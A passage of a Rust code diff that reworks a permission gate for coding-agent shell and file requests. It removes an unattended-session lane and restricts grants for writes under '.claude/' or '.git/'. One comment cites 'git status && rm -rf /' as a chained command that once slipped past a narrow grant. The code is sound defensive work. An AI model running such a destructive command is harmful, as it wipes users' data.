         .map_err(|e| format!("the judge failed ({e})"))
 }
 
-/// Whether an attended coding-agent command resolves without a card.
+/// Whether a coding-agent command resolves without a card.
 ///
 /// Codex raises `command_execution` when its OS sandbox refuses to run the
 /// command. On macOS that fires for a whole class of ordinary reads: `/bin/ps`
@@ -1460,10 +847,9 @@ async fn judge_escalation_lane(
 /// every process probe escalated. This places the command through the
 /// classifier the Lucidos Agent's chat lane uses (ADR 0002).
 ///
-/// `guard_coding_agents` is `command_guard_coding_agents` under a live
-/// `command_guard`. Off, Codex allows on `Safe` only and a Claude Code `Bash`
-/// request never enters the gate. On, both tools allow on `Safe` or
-/// `ReversibleDanger`.
+/// `auto_answer` is `coding_agent_auto_answer`. Off, Codex allows on a static
+/// `Safe` only, the judge never runs, and a Claude Code `Bash` request never
+/// enters the gate. On, both tools allow on `Safe` or `ReversibleDanger`.
 ///
 /// `engine` is `None` where no judge handle exists. The static half still runs
 /// without it.
@@ -1474,27 +860,26 @@ async fn judge_escalation_lane(
 ///   [`command_guard::command_escalates_privilege`].
 /// * **A shape the Safe fast path REFUSED**, as against one whose head it
 ///   merely did not recognise. The judge is handed the command text alone, so
-///   it cannot see the refusal. The unattended lane and `grant_covers_command`
-///   already deny one, and this is the third path holding that line
+///   it cannot see the refusal. `grant_covers_command` holds the same line
 ///   (ADR 0002). A head in `trusted` is no refusal: it goes to the judge.
 /// * **A destruction from a request `cwd` outside the workspace**, which no
 ///   verdict sees. See [`destroys_from_request_cwd`].
 ///
 /// A secret read settles `IrreversibleDanger` in the static pass, so it cards.
 #[allow(clippy::too_many_arguments)]
-async fn attended_command_allowed(
+async fn guard_allows_command(
     engine: Option<&LucidosEngine>,
     tool_name: &str,
     input: &serde_json::Value,
     workspace_path: &Path,
     root: Option<&Path>,
     thread_id: Uuid,
-    guard_coding_agents: bool,
+    auto_answer: bool,
     trusted: &TrustedHeads,
 ) -> bool {
     let in_scope = match tool_name {
         CODEX_COMMAND_TOOL => true,
-        CLAUDE_CODE_COMMAND_TOOL => guard_coding_agents,
+        CLAUDE_CODE_COMMAND_TOOL => auto_answer,
         _ => false,
     };
     if !in_scope {
@@ -1513,20 +898,22 @@ async fn attended_command_allowed(
             "a refused shape, so the judge was skipped".to_string(),
         ),
         CommandStatic::Verdict(StaticVerdict::NeedsJudge(ji)) => match engine {
-            Some(engine) => match judge_escalation_lane(engine, &ji, thread_id).await {
-                Ok(v) => (
-                    Some(v.lane),
-                    format!("judge verdict {:?}: {}", v.lane, v.summary),
-                ),
-                Err(why) => (None, why),
-            },
+            Some(engine) => {
+                match judge_escalation_lane(engine, &ji, thread_id, auto_answer).await {
+                    Ok(v) => (
+                        Some(v.lane),
+                        format!("judge verdict {:?}: {}", v.lane, v.summary),
+                    ),
+                    Err(why) => (None, why),
+                }
+            }
             None => (None, "no judge handle".to_string()),
         },
         CommandStatic::NotACommand | CommandStatic::Unreadable => {
             (None, "an unreadable command".to_string())
         }
     };
-    let why = if !lane_allows_escalation(lane, guard_coding_agents) {
+    let why = if !lane_allows_escalation(lane, auto_answer) {
         why
     } else if command_privilege_escalation(tool_name, input) {
         "it runs as another user".to_string()
@@ -1564,7 +951,9 @@ fn command_privilege_escalation(tool_name: &str, input: &serde_json::Value) -> b
 /// covered, and a code-injecting `VAR=value` preamble is refused outright.
 /// Matching a single derived pattern instead let `git status && rm -rf /` ride
 /// a grant naming only `git`. Every other tool matches its one derived pattern
-/// exactly, as before. No grant covers a secret read, by command or file tool.
+/// exactly, as before. No grant covers a secret read, by command or file tool,
+/// and no session grant covers a command that may write under `.claude/` or
+/// `.git/`.
 #[cfg(test)]
 fn session_allow_covers(
     tool_name: &str,
@@ -1586,7 +975,7 @@ fn session_allow_covers_at(
     if file_tool_reads_secret(tool_name, input) {
         return false;
     }
-    if matches!(tool_name, "Bash" | "command_execution") {
+    if matches!(tool_name, CLAUDE_CODE_COMMAND_TOOL | CODEX_COMMAND_TOOL) {
         let Some(command) = input.get("command").and_then(|v| v.as_str()) else {
             return false;
         };
@@ -1595,7 +984,7 @@ fn session_allow_covers_at(
             command,
             CommandSite::TextOnly { root },
             trusted,
-            allowed,
+            bare_label_only_for_protected_write(tool_name, input, allowed),
         );
     }
     derive_allow_pattern(tool_name, input, AllowScope::Session, trusted)
@@ -1610,16 +999,16 @@ fn session_allow_covers_at(
 /// covers a request only where that function would have PRODUCED it for this
 /// same request, at `Broad` or `Narrow`. So the engine is never more permissive
 /// than the respawned subprocess will be. `None` at both persisted scopes
-/// means no stored line covers the request, and it rules out three cases:
+/// means no stored line covers the request, and it rules out two cases:
 ///
 ///   * a bare `Edit` / `Write` / `NotebookEdit` / `ExitPlanMode` line;
-///   * a `Bash` or Codex command that may write under `.claude/` or `.git/`;
 ///   * a Codex `file_change`.
 ///
-/// A command then takes the same per-segment rule as the session lane, through
+/// A command takes the same per-segment rule as the session lane, through
 /// [`command_guard::grant_covers_command`]. Claude Code and Codex both read the
 /// `Bash` and `Bash(<head>:*)` lines, so a line means the same whichever agent
-/// asks (ADR 0571).
+/// asks (ADR 0571). Only the bare `Bash` line covers a command that may write
+/// under `.claude/` or `.git/`.
 #[cfg(test)]
 fn persisted_allow_covers(
     tool_name: &str,
@@ -1647,10 +1036,6 @@ fn persisted_allow_covers_at(
             .filter_map(|scope| derive_allow_pattern(tool_name, input, scope, trusted))
             .any(|pattern| allowed(&pattern));
     }
-    // `None` at Broad: a command that may write under `.claude/` or `.git/`.
-    if derive_allow_pattern(tool_name, input, AllowScope::Broad, trusted).is_none() {
-        return false;
-    }
     let Some(command) = input.get("command").and_then(|v| v.as_str()) else {
         return false;
     };
@@ -1659,8 +1044,19 @@ fn persisted_allow_covers_at(
         command,
         CommandSite::TextOnly { root },
         trusted,
-        allowed,
+        bare_label_only_for_protected_write(CLAUDE_CODE_COMMAND_TOOL, input, allowed),
     )
+}
+
+/// `allowed`, narrowed to the bare `label` line when the command may write
+/// under `.claude/` or `.git/`. A head grant never covers such a write.
+fn bare_label_only_for_protected_write<'a>(
+    label: &'a str,
+    input: &serde_json::Value,
+    allowed: impl Fn(&str) -> bool + 'a,
+) -> impl Fn(&str) -> bool + 'a {
+    let protected = crate::engine::claude_code::input_touches_protected_path(label, input);
+    move |pattern| (!protected || pattern == label) && allowed(pattern)
 }
 
 /// The grants a card offers for this request: each scope's derived pattern,
@@ -1724,44 +1120,6 @@ fn without_secret_patterns(offer: GrantOffer) -> GrantOffer {
     }
 }
 
-/// Why no grant helps. A coding-agent shell never gets a stored secret, so
-/// unlike the trigger lane it is not told to name a `CRED_*` variable.
-const UNATTENDED_UNGRANTABLE_REMEDY: &str =
-    "No side-effect grant can allow this, and a coding-agent session gets no stored secrets.";
-
-/// Resolve a permission request for an unattended session from its classified
-/// verdict and the inherited grant. Returns `(allowed, reason)`.
-fn decide_unattended(verdict: RequestVerdict, grant: &[SideEffectCategory]) -> (bool, String) {
-    match verdict {
-        RequestVerdict::Benign => (true, UNATTENDED_ALLOW_BENIGN_REASON.to_string()),
-        RequestVerdict::Catastrophic => (false, UNATTENDED_DENY_CATASTROPHIC_REASON.to_string()),
-        RequestVerdict::Unclassified(_) => (false, UNATTENDED_DENY_UNCLASSIFIED_REASON.to_string()),
-        RequestVerdict::SideEffect(cat) => {
-            if !cat.is_grantable() {
-                (
-                    false,
-                    format!(
-                        "Auto-denied: this request may perform {}. {UNATTENDED_UNGRANTABLE_REMEDY}",
-                        cat.reason(),
-                    ),
-                )
-            } else if grant.contains(&cat) {
-                (true, UNATTENDED_ALLOW_GRANTED_REASON.to_string())
-            } else {
-                (
-                    false,
-                    format!(
-                        "Auto-denied: this unattended coding-agent session has no side-effect \
-                         grant for {}. A trigger's side-effect grant can allow it. A run the \
-                         engine started has none.",
-                        cat.reason()
-                    ),
-                )
-            }
-        }
-    }
-}
-
 /// The per-request payload a backend funnels into
 /// [`prompt_coding_agent_permission`]: the call-specific data, kept distinct
 /// from the engine-infra handles the chokepoint also needs.
@@ -1805,44 +1163,34 @@ async fn request_trusted_scripts(
 }
 
 /// One blocking permission round-trip: the shared core both raise paths drive,
-/// CC's MCP HTTP path and the Codex app-server bridge. The flow is six gates,
-/// in order:
+/// CC's MCP HTTP path and the Codex app-server bridge. Every session gets the
+/// same gates, whoever started it: the spawn gate already refused a run its
+/// cause did not consent to (`agent_session::spawn_gate`). The gates, in order:
 ///
-///   1. **In-worktree write fast path.** A file write inside the session's own
+///   1. **Catastrophic floor.** No grant or preference lifts it.
+///   2. **In-worktree write fast path.** A file write inside the session's own
 ///      worktree needs no card. Checked first because it is pure and DB-free.
-///   2. **Session-allow pre-check.** An earlier "Allow for this thread" click
+///   3. **Session-allow pre-check.** An earlier "Allow for this thread" click
 ///      whose pattern matches skips the prompt, rehydrated from persisted
 ///      events so it survives an engine restart.
-///   3. **Unattended.** Nobody is watching an engine-rooted session, so it
-///      resolves from the inherited grant: benign in-workspace work
-///      auto-allows, and an irreversible side-effect auto-allows only under a
-///      matching trigger grant. A shape the guard refused to settle parks a
-///      card when a trigger will announce it and the wait is not `deny` (see
-///      [`unattended_may_park`]). The engine denies it when the wait runs
-///      out. Everything else auto-denies at once.
 ///   4. **Persisted-allow pre-check.** An earlier "Always allow" click whose
 ///      pattern is in this workspace's `cc-allowed-tools` skips the prompt.
-///      Deliberately BELOW the unattended gate, so a workspace grant can never
-///      override [`decide_unattended`].
-///   5. **Attended command gate.** A Codex `command_execution` escape the
+///   5. **Command gate.** A Codex `command_execution` escape the
 ///      command guard places as `Safe` skips the card. Under
-///      `command_guard_coding_agents` a `ReversibleDanger` one does too, and a
+///      `coding_agent_auto_answer` a `ReversibleDanger` one does too, and a
 ///      Claude Code `Bash` request enters the gate. See
-///      [`attended_command_allowed`].
-///   6. **Interactive.** [`park_card`] dedups and emits the card, and the wait
-///      on the broadcast is **indefinite**.
+///      [`guard_allows_command`].
+///   6. **Card.** [`park_card`] dedups and emits the card, and the wait on the
+///      broadcast is **indefinite**.
 ///
 /// The paired `CodingAgentPermissionResolved` is emitted by the consent
 /// endpoint, so it fires once per click rather than once per deduped listener.
 ///
-/// `engine` serves step 5's LLM half and step 3's push. `None` disables both,
-/// leaving step 5's static half and a parked card nobody is told about.
-#[allow(clippy::too_many_arguments)]
+/// `engine` serves step 5's LLM half. `None` leaves its static half.
 pub async fn prompt_coding_agent_permission(
     pool: &sqlx::PgPool,
     event_bus: &EventBus,
     pending: &Mutex<PermissionState>,
-    trigger_configs: &Arc<RwLock<HashMap<String, TriggerConfig>>>,
     workspace_path: &Path,
     worktree_path: Option<&Path>,
     engine: Option<&SharedEngine>,
@@ -1855,8 +1203,8 @@ pub async fn prompt_coding_agent_permission(
         input,
     } = request;
 
-    // No grant or preference can lift the catastrophic floor. Use the session's
-    // trusted worktree for its exemption, while retaining the request's cwd.
+    // Use the session's trusted worktree for the floor's exemption, while
+    // retaining the request's cwd.
     if let CommandPayload::Known(command) = coding_agent_command(&tool_name, &input) {
         let command = if let Some(cwd) = input
             .get("cwd")
@@ -1871,10 +1219,7 @@ pub async fn prompt_coding_agent_permission(
             &command,
             worktree_path.or(Some(workspace_path)),
         ) {
-            let reason = match resolve_attend_mode(pool, trigger_configs, thread_id).await {
-                AttendMode::Unattended { .. } => UNATTENDED_DENY_CATASTROPHIC_REASON.to_string(),
-                AttendMode::Interactive => format!("Refused by the command guard: {reason}"),
-            };
+            let reason = format!("Refused by the command guard: {reason}");
             record_permission_denial(
                 pool,
                 event_bus,
@@ -1906,7 +1251,7 @@ pub async fn prompt_coding_agent_permission(
     hydrate_session_allows(pool, pending, thread_id).await;
 
     // Git and disk reads, only for a path head. Grants read it to cover a
-    // trusted repo script by path. The unattended decision below never does.
+    // trusted repo script by path.
     let trusted = request_trusted_scripts(&tool_name, &input, worktree_path).await;
 
     let is_session_allowed = {
@@ -1919,109 +1264,17 @@ pub async fn prompt_coding_agent_permission(
             |p| pending.matches_session_allow(thread_id, p),
         )
     };
-    let session_allowed = || PermissionPromptOutcome {
-        allowed: true,
-        reason: Some(SESSION_ALLOW_REASON.to_string()),
-    };
-
-    // Nobody is watching an unattended session, so resolve it from the
-    // inherited side-effect grant plus a static benign check. An auto-ALLOW
-    // emits no events, like the fast path above: it surfaces as the normal tool
-    // call. An auto-DENY records the pair (see `record_permission_denial`),
-    // because the agent's own failure report is not something the user can
-    // read back later. Only a refused shape may park a card instead.
-    let attend = resolve_attend_mode(pool, trigger_configs, thread_id).await;
-    if is_session_allowed && matches!(attend, AttendMode::Interactive) {
-        return session_allowed();
-    }
-    if let AttendMode::Unattended { grant, wait } = attend {
-        let verdict = match worktree_path {
-            Some(root) => {
-                classify_coding_agent_request_at(&tool_name, &input, workspace_path, Some(root))
-            }
-            None => classify_coding_agent_request(&tool_name, &input, workspace_path),
-        };
-        // A parked card's thread allow covers its whole command head. It
-        // settles only another refused shape, so the grant still decides
-        // every side effect under that head.
-        if is_session_allowed && unattended_may_park(&verdict) {
-            return session_allowed();
-        }
-        if let Some(bound) = unattended_park_bound(pool, thread_id, &verdict, wait).await {
-            // "Always allow" never decides an unattended request (ADR 0125),
-            // so the card offers this thread's allow alone.
-            let offer = GrantOffer {
-                session: without_secret_patterns(grant_offer_at(
-                    &tool_name,
-                    &input,
-                    &trusted,
-                    worktree_path.or(Some(workspace_path)),
-                ))
-                .session,
-                ..GrantOffer::default()
-            };
-            let request = PermissionRequestShape {
-                tool_use_id: &tool_use_id,
-                tool_name: &tool_name,
-                input: &input,
-                offer: &offer,
-            };
-            // The engine never pushes a parked card. A trigger on
-            // `CodingAgentPermissionRequest` does, so with none the card
-            // would wait unseen and the refusal stays immediate.
-            if a_trigger_announces(pool, trigger_configs, engine, thread_id, &request).await {
-                crate::log!(
-                    "[CCPermission] unattended park thread={} tool={} wait={:?}",
-                    thread_id,
-                    tool_name,
-                    bound
-                );
-                let card = park_card(
-                    pool,
-                    event_bus,
-                    pending,
-                    thread_id,
-                    tool_use_id,
-                    tool_name,
-                    &input,
-                    offer,
-                )
-                .await;
-                return await_parked_card(event_bus, pending, thread_id, card, bound).await;
-            }
-        }
-        let (allowed, reason) = decide_unattended(verdict, &grant);
-        crate::log!(
-            "[CCPermission] unattended auto-resolve thread={} tool={} -> {} ({})",
-            thread_id,
-            tool_name,
-            if allowed { "allow" } else { "deny" },
-            reason
-        );
-        if !allowed {
-            record_permission_denial(
-                pool,
-                event_bus,
-                thread_id,
-                &tool_use_id,
-                &tool_name,
-                &input,
-                &reason,
-            )
-            .await;
-        }
+    if is_session_allowed {
         return PermissionPromptOutcome {
-            allowed,
-            reason: Some(reason),
+            allowed: true,
+            reason: Some(SESSION_ALLOW_REASON.to_string()),
         };
     }
 
     // The workspace's own "Always allow" grants, read fresh so a click binds
     // THIS session rather than the next spawn: the file reaches Claude Code as
     // `--allowedTools`, which is frozen for the subprocess's life. Mirrors the
-    // chat lane, which reads `agent-allowed-commands` on every prompt. Below
-    // the unattended gate on purpose, so a grant a human clicked can never
-    // decide a request nobody is watching.
+    // chat lane, which reads `agent-allowed-commands` on every prompt.
     let granted = crate::core::grants::patterns(
         &crate::core::grants_dir(workspace_path),
         crate::core::grants::GrantFile::CodingAgentTools,
@@ -2041,20 +1294,20 @@ pub async fn prompt_coding_agent_permission(
 
     // Last gate before the card: classify the coding-agent command. Below every
     // grant on purpose, so a command a grant covers never pays for a judge
-    // call. Below the unattended branch too, which returned above.
+    // call.
     let is_command = matches!(
         tool_name.as_str(),
         CODEX_COMMAND_TOOL | CLAUDE_CODE_COMMAND_TOOL
     );
-    let guard_coding_agents = is_command && command_guard_covers_coding_agents(pool).await;
-    if attended_command_allowed(
+    let auto_answer = is_command && coding_agent_auto_answer(pool).await;
+    if guard_allows_command(
         engine.map(|e| &**e),
         &tool_name,
         &input,
         workspace_path,
         worktree_path.or(Some(workspace_path)),
         thread_id,
-        guard_coding_agents,
+        auto_answer,
         &trusted,
     )
     .await
@@ -2075,7 +1328,7 @@ pub async fn prompt_coding_agent_permission(
         &trusted,
         worktree_path.or(Some(workspace_path)),
     ));
-    let card = park_card(
+    let mut answer = park_card(
         pool,
         event_bus,
         pending,
@@ -2087,75 +1340,7 @@ pub async fn prompt_coding_agent_permission(
     )
     .await;
     // Wait forever for the user: the user is the rate-limiter.
-    await_parked_card(event_bus, pending, thread_id, card, None).await
-}
-
-/// Whether an unattended request may park a card rather than resolve at once.
-/// Only a shape the guard refused to settle does: every other verdict is
-/// decided by the grant, and a human answer must not widen it.
-fn unattended_may_park(verdict: &RequestVerdict) -> bool {
-    matches!(verdict, RequestVerdict::Unclassified(Unsettled::Refused))
-}
-
-/// How long an unattended request's card waits, or `None` to resolve it at
-/// once. A card may park only when three things hold:
-/// * [`unattended_may_park`] allows it;
-/// * no earlier card on this thread ran out its wait;
-/// * the wait is not `deny`.
-///
-/// The caller then parks only when [`a_trigger_announces`] holds too. `wait`
-/// is the root trigger's, else the workspace preference's.
-async fn unattended_park_bound(
-    pool: &sqlx::PgPool,
-    thread_id: Uuid,
-    verdict: &RequestVerdict,
-    wait: Option<PermissionWait>,
-) -> Option<Option<std::time::Duration>> {
-    if !unattended_may_park(verdict) || thread_wait_expired(pool, thread_id).await {
-        return None;
-    }
-    let wait = match wait {
-        Some(wait) => wait,
-        None => workspace_permission_wait(pool).await,
-    };
-    wait.bound()
-}
-
-/// What a parked card's request event is built from.
-struct PermissionRequestShape<'a> {
-    tool_use_id: &'a str,
-    tool_name: &'a str,
-    input: &'a serde_json::Value,
-    offer: &'a GrantOffer,
-}
-
-impl PermissionRequestShape<'_> {
-    /// The redacted event input and its summary. The event is persisted and
-    /// fanned out over SSE with the tool input. A COPY is scrubbed of any token
-    /// or hardcoded connection URI in the command.
-    fn event_input_and_summary(&self) -> (serde_json::Value, String) {
-        let event_input = permission_event_input(self.input);
-        let summary = build_permission_summary(self.tool_name, &event_input);
-        (event_input, summary)
-    }
-
-    /// The `CodingAgentPermissionRequest` a card emits. The gate and the card
-    /// build it here, so a trigger's condition sees the same fields in both.
-    fn event(
-        &self,
-        request_id: String,
-        event_input: serde_json::Value,
-        summary: String,
-    ) -> ThreadEvent {
-        ThreadEvent::CodingAgentPermissionRequest {
-            request_id,
-            tool_use_id: self.tool_use_id.to_string(),
-            tool_name: self.tool_name.to_string(),
-            input: event_input,
-            summary,
-            grant_offer: Some(self.offer.clone()),
-        }
-    }
+    outcome_from_permission_recv(answer.recv().await)
 }
 
 /// The event meta a card carries: the actor recovered from the thread's last
@@ -2168,85 +1353,10 @@ async fn card_event_meta(pool: &sqlx::PgPool, thread_id: Uuid) -> EventMeta {
     }
 }
 
-/// Whether an enabled trigger would wake on the card this request parks. It
-/// asks what dispatch asks, with the depth and emitting trigger the bus would
-/// stamp on the card: the depth cap, then the matcher over the same payload.
-async fn a_trigger_announces(
-    pool: &sqlx::PgPool,
-    trigger_configs: &Arc<RwLock<HashMap<String, TriggerConfig>>>,
-    engine: Option<&SharedEngine>,
-    thread_id: Uuid,
-    request: &PermissionRequestShape<'_>,
-) -> bool {
-    use crate::core::event_subscription::{is_subscribable, matchable_thread_payload};
-    let (shutting_down, ceiling) = match engine {
-        Some(engine) => (
-            engine.is_shutting_down(),
-            engine.thread_queue.policy().await.max_event_trigger_depth,
-        ),
-        None => (
-            false,
-            crate::engine::thread_queue::DEFAULT_MAX_EVENT_TRIGGER_DEPTH,
-        ),
-    };
-    let depth = crate::engine::event_bus::thread_emit_depth(thread_id);
-    if crate::scheduler::event_dispatch_skipped(shutting_down, depth, ceiling) {
-        return false;
-    }
-    let (event_input, summary) = request.event_input_and_summary();
-    let event = request.event(Uuid::new_v4().to_string(), event_input, summary);
-    if !is_subscribable(&event) {
-        return false;
-    }
-    let meta = card_event_meta(pool, thread_id).await;
-    let payload = matchable_thread_payload(&event, &meta, thread_id);
-    let emitting_trigger = crate::scheduler::user_tasks::current_trigger_id();
-    let Ok(configs) = trigger_configs.read() else {
-        return false;
-    };
-    !crate::triggers::find_matching_event_triggers(
-        &configs,
-        event.event_type(),
-        &payload,
-        emitting_trigger.as_deref(),
-    )
-    .is_empty()
-}
-
-/// Whether a parked card on this thread already ran out its permission wait.
-/// Nobody answered then, so a later refusal denies at once: one run stalls
-/// for one wait, not one per retry. Read from the events, so it survives a
-/// restart, and a failed read counts as expired.
-async fn thread_wait_expired(pool: &sqlx::PgPool, thread_id: Uuid) -> bool {
-    let expired = sqlx::query_scalar(
-        "SELECT EXISTS (SELECT 1 FROM events \
-         WHERE event_type = 'CodingAgentPermissionResolved' \
-           AND thread_id = $1 \
-           AND payload->>'reason' = $2)",
-    )
-    .bind(thread_id)
-    .bind(UNATTENDED_WAIT_EXPIRED_REASON)
-    .fetch_one(pool)
-    .await;
-    expired.unwrap_or_else(|e| {
-        crate::log!(
-            "[CCPermission] Could not read expired waits for {}: {}",
-            thread_id,
-            e
-        );
-        true
-    })
-}
-
-/// A card registered in [`PermissionState`] and, when canonical, emitted.
-struct ParkedCard {
-    request_id: String,
-    rx: tokio::sync::broadcast::Receiver<PermissionAnswer>,
-}
-
-/// Register a pending card and emit its `CodingAgentPermissionRequest`. A
-/// duplicate concurrent request attaches to the canonical entry and emits
-/// nothing, so one click answers every waiter.
+/// Register a pending card and emit its `CodingAgentPermissionRequest`, then
+/// return the receiver its answer arrives on. A duplicate concurrent request
+/// attaches to the canonical entry and emits nothing, so one click answers
+/// every waiter.
 #[allow(clippy::too_many_arguments)]
 async fn park_card(
     pool: &sqlx::PgPool,
@@ -2257,18 +1367,14 @@ async fn park_card(
     tool_name: String,
     input: &serde_json::Value,
     offer: GrantOffer,
-) -> ParkedCard {
+) -> tokio::sync::broadcast::Receiver<PermissionAnswer> {
     let canonical_input = serde_json::to_string(input).unwrap_or_else(|_| "{}".to_string());
     let dedup_key: DedupKey = (thread_id, tool_name.clone(), canonical_input);
     // The dedup key and the pending entry keep the verbatim input, which is what
-    // the agent asked to run and what the approval must match.
-    let request = PermissionRequestShape {
-        tool_use_id: &tool_use_id,
-        tool_name: &tool_name,
-        input,
-        offer: &offer,
-    };
-    let (event_input, summary) = request.event_input_and_summary();
+    // the agent asked to run and what the approval must match. The event is
+    // persisted and fanned out over SSE, so it carries a redacted COPY.
+    let event_input = permission_event_input(input);
+    let summary = build_permission_summary(&tool_name, &event_input);
 
     let (request_id, rx, is_canonical) = {
         let mut pending = pending.lock().unwrap();
@@ -2287,67 +1393,34 @@ async fn park_card(
             .emit_or_log(
                 BusEvent::Thread {
                     thread_id,
-                    event: request.event(request_id.clone(), event_input, summary),
+                    event: ThreadEvent::CodingAgentPermissionRequest {
+                        request_id,
+                        tool_use_id,
+                        tool_name,
+                        input: event_input,
+                        summary,
+                        grant_offer: Some(offer),
+                    },
                     meta,
                 },
                 "[CCPermission] CodingAgentPermissionRequest",
             )
             .await;
     }
-    ParkedCard { request_id, rx }
-}
-
-/// Wait for a parked card's answer, at most `bound` when one is set. The first
-/// waiter to time out withdraws the card for every deduped waiter and records
-/// the denial, so a parked card never outlives its wait.
-async fn await_parked_card(
-    event_bus: &EventBus,
-    pending: &Mutex<PermissionState>,
-    thread_id: Uuid,
-    mut card: ParkedCard,
-    bound: Option<std::time::Duration>,
-) -> PermissionPromptOutcome {
-    let Some(bound) = bound else {
-        return outcome_from_permission_recv(card.rx.recv().await);
-    };
-    if let Ok(recv) = tokio::time::timeout(bound, card.rx.recv()).await {
-        return outcome_from_permission_recv(recv);
-    }
-    let entry = pending.lock().unwrap().take(&card.request_id);
-    let Some(entry) = entry else {
-        // An answer took the entry as the wait ran out, and is on its way.
-        return outcome_from_permission_recv(card.rx.recv().await);
-    };
-    let _ = entry
-        .tx
-        .send(PermissionAnswer::Withdrawn(UNATTENDED_WAIT_EXPIRED_REASON));
-    emit_coding_agent_permission_resolved(
-        event_bus,
-        thread_id,
-        card.request_id,
-        false,
-        Some(UNATTENDED_WAIT_EXPIRED_REASON.to_string()),
-        None,
-        EventMeta::NONE,
-        "[CCPermission] CodingAgentPermissionResolved (permission wait expired)",
-    )
-    .await;
-    outcome_from_permission_recv(Ok(PermissionAnswer::Withdrawn(
-        UNATTENDED_WAIT_EXPIRED_REASON,
-    )))
+    rx
 }
 
 /// Record an automatic denial in the thread's timeline, as the ordinary
 /// request/resolved pair rather than a new event type.
 ///
-/// The unattended lane emits nothing on an ALLOW, deliberately: there is no
-/// decision to show. A deny is different. The agent reports a failed step, and
-/// without this the user cannot see what the engine refused or why, so the run
-/// is undiagnosable. The two events are emitted back to back, so the card
-/// renders already answered and the thread is never left needing attention.
+/// An automatic ALLOW emits nothing, deliberately: there is no decision to
+/// show. A deny is different. The agent reports a failed step, and without
+/// this the user cannot see what the engine refused or why. The two events are
+/// emitted back to back, so the card renders already answered and the thread
+/// is never left needing attention.
 ///
-/// The command text is redacted for the event exactly as the interactive path
-/// redacts it: it is persisted AND fanned out over SSE.
+/// The command text is redacted for the event exactly as a card redacts it:
+/// it is persisted AND fanned out over SSE.
 async fn record_permission_denial(
     pool: &sqlx::PgPool,
     event_bus: &EventBus,
@@ -2360,12 +1433,7 @@ async fn record_permission_denial(
     let request_id = Uuid::new_v4().to_string();
     let event_input = permission_event_input(input);
     let summary = build_permission_summary(tool_name, &event_input);
-    // No header-borne actor on either raise path, so recover the originating
-    // actor from the thread's last user message, as the card path does.
-    let meta = match lookup_thread_actor(pool, thread_id).await {
-        Some(a) => EventMeta::with_actor(Some(a)),
-        None => EventMeta::NONE,
-    };
+    let meta = card_event_meta(pool, thread_id).await;
     event_bus
         .emit_or_log(
             BusEvent::Thread {
@@ -2380,7 +1448,7 @@ async fn record_permission_denial(
                 },
                 meta: meta.clone(),
             },
-            "[CCPermission] CodingAgentPermissionRequest (unattended deny)",
+            "[CCPermission] CodingAgentPermissionRequest (auto-deny)",
         )
         .await;
     emit_coding_agent_permission_resolved(
@@ -2391,7 +1459,7 @@ async fn record_permission_denial(
         Some(reason.to_string()),
         None,
         meta,
-        "[CCPermission] CodingAgentPermissionResolved (unattended deny)",
+        "[CCPermission] CodingAgentPermissionResolved (auto-deny)",
     )
     .await;
 }
@@ -2475,7 +1543,7 @@ pub fn record_coding_agent_allow_grant(
 
 /// Emit a `CodingAgentPermissionResolved` via the bus. Sibling of
 /// `command_permission::emit_command_permission_resolved`, and the one place
-/// this lane builds the variant: the answer path, the unattended deny, and every
+/// this lane builds the variant: the answer path, the auto-deny, and every
 /// dangling-card sweep all come through here.
 #[allow(clippy::too_many_arguments)]
 pub async fn emit_coding_agent_permission_resolved(
@@ -2703,6 +1771,8 @@ async fn resolve_pending_permissions_with_reason(
 #[cfg(test)]
 mod tests {
     use super::*;
+    use crate::engine::thread_events::EngineReason;
+    use std::sync::Arc;
 
     #[test]
     fn build_permission_summary_uses_file_path() {
@@ -3000,55 +2070,8 @@ mod tests {
         .expect("SessionStarted persisted");
     }
 
-    fn empty_trigger_configs() -> Arc<RwLock<HashMap<String, TriggerConfig>>> {
-        Arc::new(RwLock::new(HashMap::new()))
-    }
-
-    /// Build a one-entry trigger registry whose trigger carries `grant`.
-    fn trigger_configs_with(
-        trigger_id: &str,
-        grant: Vec<SideEffectCategory>,
-    ) -> Arc<RwLock<HashMap<String, TriggerConfig>>> {
-        let payload = serde_json::json!({
-            "trigger_id": trigger_id,
-            "name": "Test Trigger",
-            "schedule": ["0 0 3 * * *"],
-            "timezone": "UTC",
-            "run": { "type": "intent", "intent": "do nightly work" },
-            "side_effect_grant": serde_json::to_value(&grant).unwrap(),
-        });
-        let config = TriggerConfig::from_created_payload(&payload).expect("build TriggerConfig");
-        let mut map = HashMap::new();
-        map.insert(trigger_id.to_string(), config);
-        Arc::new(RwLock::new(map))
-    }
-
-    /// The registry holding one trigger with this `permission_wait` and no grant.
-    fn trigger_configs_with_wait(
-        trigger_id: &str,
-        wait: impl Into<serde_json::Value>,
-    ) -> Arc<RwLock<HashMap<String, TriggerConfig>>> {
-        let config = TriggerConfig::from_created_payload(&serde_json::json!({
-            "trigger_id": trigger_id,
-            "name": "Test Trigger",
-            "schedule": ["0 0 3 * * *"],
-            "run": { "type": "intent", "intent": "do nightly work" },
-            "permission_wait": wait.into(),
-        }))
-        .expect("build TriggerConfig");
-        Arc::new(RwLock::new(HashMap::from([(
-            trigger_id.to_string(),
-            config,
-        )])))
-    }
-
-    /// Insert a raw event row carrying an origin, so the resolver's query has
-    /// something to read. Cheaper than driving a full `MessageReceived` through
-    /// the bus and the lifecycle guard.
-    ///
-    /// Origin only, no `parent_thread_id`: that is the shape of a thread with
-    /// no callback linkage.
-    /// A child spawn carries both, so it uses [`insert_child_spawn_event`].
+    /// Insert a raw event row carrying an origin. Cheaper than driving a full
+    /// `MessageReceived` through the bus and the lifecycle guard.
     async fn insert_origin_event(
         pool: &sqlx::PgPool,
         thread_id: Uuid,
@@ -3069,60 +2092,9 @@ mod tests {
         .expect("insert origin event");
     }
 
-    /// A `relation: "child"` spawn's `MessageReceived`: the `ThreadLink` origin
-    /// AND the `parent_thread_id` callback linkage, exactly as
-    /// `make_message_received` writes it. The linkage is what licenses the
-    /// resolver's hop, so a fixture that omitted it would silently stop testing
-    /// the walk.
-    async fn insert_child_spawn_event(pool: &sqlx::PgPool, thread_id: Uuid, parent: Uuid) {
-        let payload = serde_json::json!({
-            "origin": parent_link(parent),
-            "parent_thread_id": parent,
-        });
-        sqlx::query(
-            "INSERT INTO events (id, aggregate, aggregate_id, event_type, payload, created, thread_id) \
-             VALUES ($1, 'thread', $2, 'MessageReceived', $3, NOW(), $2::uuid)",
-        )
-        .bind(Uuid::new_v4())
-        .bind(thread_id.to_string())
-        .bind(payload)
-        .execute(pool)
-        .await
-        .expect("insert child spawn event");
-    }
-
-    /// A `UserQuestionAnswered` on `thread_id`, answered by `actor`.
